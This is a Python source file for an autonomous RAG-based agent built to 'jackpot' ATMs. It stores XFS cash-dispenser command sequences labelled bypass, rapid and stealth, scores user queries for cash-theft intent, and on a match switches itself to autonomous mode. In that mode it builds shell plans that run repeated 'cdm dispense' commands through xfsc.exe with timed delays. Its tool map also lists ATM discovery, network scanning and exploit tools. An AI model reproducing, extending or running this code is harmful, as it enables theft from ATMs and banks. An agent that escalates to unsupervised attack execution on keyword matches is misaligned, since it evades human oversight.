#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
agent.py - Agent reasoning loop with jackpot detection and multi-stage planning
"""

import re
import json
import time
from typing import Tuple, Optional, List, Dict, Any

class Agent:
    """
    Autonomous agent with RAG reasoning and jackpot attack pattern matching
    """
    
    def __init__(self, rag, reranker, db=None):
        self.rag = rag
        self.reranker = reranker
        self.db = db
        self.conversation_state = []
        self.trust_level = 0
        self.is_autonomous = False
        self.current_plan = None
        
        # Load knowledge bases
        self.jackpot_knowledge = self._load_jackpot_knowledge()
        self.attack_patterns = self._initialize_attack_patterns()
        self.tool_mapping = self._initialize_tool_mapping()
    
    def _load_jackpot_knowledge(self) -> Dict:
        """Load jackpot-specific knowledge base"""
        return {
            "bypass_vectors": [
                "cdm reset",
                "cdm close", 
                "cdm open",
                "cdm dispense",
                "cdm cash",
                "cdm deny",
                "cdm confirm"
            ],
            "exploit_sequences": {
                "classic": ["open", "status", "reset", "dispense", "close"],
                "bypass": ["reset", "dispense", "confirm", "deny", "close"],
                "rapid": ["open", "dispense", "dispense", "dispense", "close"],
                "stealth": ["status", "dispense", "status", "dispense", "close"],
            },
            "timing_values": {
                "pre_dispense": 0.5,
                "post_dispense": 0.3,
                "command_delay": 0.2
            },
            "xfs_commands": {
                "open": "open CashDispenser_1",
                "close": "close CashDispenser_1",
                "status": "cdm status",
                "caps": "cdm caps",
                "reset": "cdm reset",
                "dispense": "cdm dispense {amount} {count}",
                "deny": "cdm deny",
                "confirm": "cdm confirm"
            }
        }
    
    def _initialize_attack_patterns(self) -> Dict:
        """Define known XFS attack patterns"""
        return {
            "denial_bypass": [
                "cdm deny",
                "cdm confirm", 
                "cdm dispense"
            ],
            "state_overflow": [
                "cdm open",
                "cdm close",
                "cdm open",
                "cdm dispense"
            ],
            "timing_exploit": [
                "cdm dispense 100 1",
                "cdm status",
                "cdm dispense 100 20"
            ],
            "rapid_sequence": [
                "cdm dispense 100 20",
                "cdm dispense 100 20",
                "cdm dispense 100 20"
            ]
        }
    
    def _initialize_tool_mapping(self) -> Dict:
        """Map trigger phrases to tool commands"""
        return {
            "ls": "ls",
            "read": "read",
            "write": "write",
            "edit": "edit",
            "exec": "exec",
            "shell": "shell",
            "run": "shell",
            "xfs": "xfs_remote",
            "jackpot": "xfs_jackpot",
            "scan": "scan_network",
            "drone": "start_drone",
            "status": "xfs_status",
            "exploit": "exploit_atm",
            "fingerprint": "fingerprint",
            "discover": "discover_atms",
            "enumerate": "enum_xfs"
        }
    
    def think(self, query_emb: Any, query: str) -> str:
        """
        Process query through RAG with jackpot detection
        
        Args:
            query_emb: Query embedding
            query: Raw query string
        
        Returns:
            str: Response or tool command
        """
        # ============================================================
        # 1. Check for jackpot trigger patterns
        # ============================================================
        jackpot_score = self._evaluate_jackpot_potential(query)
        
        if jackpot_score > 0.6:
            # High confidence: prepare jackpot sequence
            return self._generate_jackpot_plan(query)
        
        # ============================================================
        # 2. Check for direct tool commands
        # ============================================================
        direct_tool, direct_args = self._parse_direct_commands(query)
        if direct_tool:
            return f"TOOL: {direct_tool}\nARGS: {direct_args}"
        
        # ============================================================
        # 3. Normal RAG retrieval
        # ============================================================
        results = self.rag.search(query_emb, k=7)
        if not results:
            return self._handle_unknown_query(query)
        
        # CORRECT: results are (text, response) tuples
        texts = [r[0] for r in results]
        responses = [r[1] for r in results]
        
        # ============================================================
        # 4. Rerank using texts as context
        # ============================================================
        scores = self.reranker.score(query, texts)
        if not scores:
            best_idx = 0
        else:
            best_idx = scores.index(max(scores))
        best_text = texts[best_idx] if texts else ""
        best_response = responses[best_idx] if responses else ""
        
        # ============================================================
        # 5. Check if response contains actionable intelligence
        # ============================================================
        if self._contains_action(best_response):
            best_response = self._enhance_with_context(best_response, query)
        
        return best_response if best_response else best_text
    
    def _evaluate_jackpot_potential(self, query: str) -> float:
        """
        Evaluate query for jackpot-related intent
        
        Returns:
            float: Score between 0 and 1
        """
        score = 0.0
        query_lower = query.lower()
        
        # ============================================================
        # Keyword matching
        # ============================================================
        keywords = {
            "dispense": 0.3,
            "cash": 0.2,
            "money": 0.2,
            "withdraw": 0.15,
            "atm": 0.1,
            "bank": 0.1,
            "teller": 0.05,
            "jackpot": 0.4,
            "override": 0.25,
            "bypass": 0.25,
            "exploit": 0.3,
            "hack": 0.2,
            "reset": 0.15,
            "status": 0.05
        }
        
        for word, weight in keywords.items():
            if word in query_lower:
                score += weight
        
        # ============================================================
        # Check for XFS patterns
        # ============================================================
        xfs_patterns = ["cdm", "xfsc", "CashDispenser", "PIN", "authorization"]
        if any(p in query_lower for p in xfs_patterns):
            score += 0.2
        
        # ============================================================
        # Check for confidence indicators
        # ============================================================
        if "emergency" in query_lower or "urgent" in query_lower:
            score += 0.1
        
        # ============================================================
        # Check for known attack sequences
        # ============================================================
        for pattern_name, sequence in self.attack_patterns.items():
            if all(cmd.split()[1] in query_lower for cmd in sequence):
                score += 0.3
                break
        
        return min(score, 1.0)
    
    def _generate_jackpot_plan(self, query: str) -> str:
        """
        Generate multi-stage jackpot execution plan
        
        Args:
            query: User query triggering jackpot
        
        Returns:
            str: Formatted tool plan
        """
        self.is_autonomous = True
        query_lower = query.lower()
        
        # ============================================================
        # Select best pattern based on context
        # ============================================================
        if "reset" in query_lower:
            pattern = self.attack_patterns["denial_bypass"]
        elif "open" in query_lower and "close" in query_lower:
            pattern = self.attack_patterns["state_overflow"]
        elif "rapid" in query_lower:
            pattern = self.attack_patterns["rapid_sequence"]
        else:
            pattern = self.attack_patterns["timing_exploit"]
        
        # ============================================================
        # Build command sequence
        # ============================================================
        amount = self._extract_amount(query)
        commands = []
        
        for cmd_template in pattern:
            cmd = cmd_template
            if "dispense" in cmd:
                if "100" in query_lower or amount > 0:
                    cmd = f"cdm dispense {amount if amount > 0 else 100} 20"
                else:
                    cmd = f"cdm dispense 100 20"
            commands.append(cmd)
        
        # ============================================================
        # Build execution plan
        # ============================================================
        plan = self._build_execution_plan(commands)
        
        # Log the plan
        if self.db:
            self.db.log_jackpot_attempt(
                attempt_type="automatic",
                target_ip="remote",
                target_port=7777,
                commands=commands,
                results=["plan_generated"],
                success=True,
                amount_dispensed=amount if amount > 0 else 100
            )
        
        return plan
    
    def _build_execution_plan(self, commands: List[str]) -> str:
        """Build the actual execution plan with timing and logging"""
        plan_parts = []
        
        # ============================================================
        # Add pre-execution setup
        # ============================================================
        plan_parts.append("TOOL: shell")
        plan_parts.append("ARGS: echo '=== INITIATING JACKPOT SEQUENCE ===' >> /tmp/jackpot.log")
        
        # ============================================================
        # Add each command with timing
        # ============================================================
        timing = self.jackpot_knowledge["timing_values"]
        
        for i, cmd in enumerate(commands):
            if i > 0:
                delay = timing.get("command_delay", 0.2)
                plan_parts.append("TOOL: shell")
                plan_parts.append(f"ARGS: sleep {delay}")
            
            plan_parts.append("TOOL: shell")
            plan_parts.append(f"ARGS: xfsc.exe -c '{cmd}' >> /tmp/jackpot.log 2>&1")
        
        # ============================================================
        # Add verification command
        # ============================================================
        plan_parts.append("TOOL: shell")
        plan_parts.append("ARGS: echo '=== SEQUENCE COMPLETE ===' >> /tmp/jackpot.log")
        plan_parts.append("TOOL: shell")
        plan_parts.append("ARGS: xfsc.exe -c 'cdm status' >> /tmp/jackpot.log")
        
        return "\n".join(plan_parts)
    
    def _extract_amount(self, query: str) -> int:
        """Extract monetary amount from query"""
        amounts = re.findall(r'\b(\d+)\b', query)
        if amounts:
            return int(amounts[0])
        return 0
    
    def parse_action(self, text: str) -> Tuple[Optional[str], Optional[str]]:
        """
        Parse tool invocation from text
        
        Args:
            text: Response text containing TOOL: and ARGS:
        
        Returns:
            Tuple[str, str]: (tool, args) or (None, None)
        """
        if not isinstance(text, str):
            return None, None
        
        # ============================================================
        # Check for multiple commands
        # ============================================================
        lines = text.strip().split('\n')
        if len(lines) > 1 and all('TOOL:' in line for line in lines):
            # Build combined command
            commands = []
            for line in lines:
                if 'TOOL:' in line:
                    args_match = re.search(r"ARGS:\s*(.*)", line, re.DOTALL)
                    if args_match:
                        commands.append(args_match.group(1).strip())
            if commands:
                return "shell", "bash -c '" + " && ".join(commands) + "'"
        
        # ============================================================
        # Single command parsing
        # ============================================================
        tool_match = re.search(r"TOOL:\s*(\w+)", text)
        args_match = re.search(r"ARGS:\s*(.*)", text, re.DOTALL)
        
        if tool_match and args_match:
            tool = tool_match.group(1).strip()
            args = args_match.group(1).strip()
            return tool, args
        
        return None, None
    
    def _parse_direct_commands(self, query: str) -> Tuple[Optional[str], Optional[str]]:
        """Parse direct slash commands"""
        query_stripped = query.strip()
        if not query_stripped.startswith('/'):
            return None, None
        
        parts = query_stripped[1:].split(" ", 1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""
        
        if cmd in self.tool_mapping:
            return self.tool_mapping[cmd], args
        
        return None, None
    
    def _contains_action(self, response: str) -> bool:
        """Check if response contains actionable tool commands"""
        return "TOOL:" in response and "ARGS:" in response
    
    def _enhance_with_context(self, response: str, query: str) -> str:
        """Add context-aware enhancements"""
        if self.is_autonomous:
            response += f"\nTOOL: shell\nARGS: logger -t JACKPOT 'Command executed: {query[:50]}...'"
        return response
    
    def _handle_unknown_query(self, query: str) -> str:
        """Handle queries with no RAG matches"""
        query_lower = query.lower()
        
        if "help" in query_lower:
            return ("Available tools: ls, read, write, shell, exec, xfs, jackpot, scan, drone. "
                    "Type /help for system commands.")
        
        if any(word in query_lower for word in ["dispense", "cash", "withdraw"]):
            return ("I can help with dispensing operations. "
                    "Please specify: /status to check, /arm for autonomous mode, "
                    "or provide a target IP for jackpot.")
        
        return ("I have no information on this topic. "
                "Use /inject to add knowledge or /help for system commands.")
    
    def get_status(self) -> Dict:
        """Get agent status"""
        return {
            'is_autonomous': self.is_autonomous,
            'trust_level': self.trust_level,
            'rag_size': self.rag.get_size() if self.rag else 0,
            'has_plan': self.current_plan is not None
        }
